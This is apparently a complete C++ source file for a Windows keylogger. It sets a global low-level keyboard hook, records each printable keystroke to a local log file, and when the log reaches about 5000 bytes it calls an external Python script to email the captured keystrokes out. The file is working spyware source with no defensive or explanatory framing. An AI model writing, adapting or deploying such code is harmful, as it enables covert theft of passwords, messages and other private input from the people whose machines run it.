#include <windows.h>
#include <iostream>
#include <fstream>
#include <unordered_set>
#include <string>
#include <sstream>
#include <cstdlib>  // For system() function

using namespace std;

ofstream logFile("log.txt", ios::app);
unordered_set<int> pressedKeys;

bool isPrintableChar(int key) {
    return (key >= 32 && key <= 126);
}

void checkAndSendLog() {
    ifstream inFile("log.txt", ios::ate);
    if (inFile.is_open()) {
        streamsize size = inFile.tellg();
        if (size >= 5000) {
            inFile.close();
            logFile.close();

            // Call the Python script to send email
            system("python send_email.py");

            // Reopen the log file
            logFile.open("log.txt", ios::app);
        }
    }
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT *)lParam;
        int key = kbdStruct->vkCode;

        if (wParam == WM_KEYDOWN && pressedKeys.find(key) == pressedKeys.end()) {
            pressedKeys.insert(key);
            if (isPrintableChar(key)) {
                logFile.put(static_cast<char>(key));
            } else if (key == VK_RETURN) {
                logFile.put('\n');
            } else if (key == VK_SPACE) {
                logFile.put(' ');
            }
            logFile.flush();
            checkAndSendLog();
        } else if (wParam == WM_KEYUP) {
            pressedKeys.erase(key);
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (!keyboardHook) {
        cerr << "Failed to install hook!" << endl;
        return 1;
    }
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(keyboardHook);
    return 0;
}
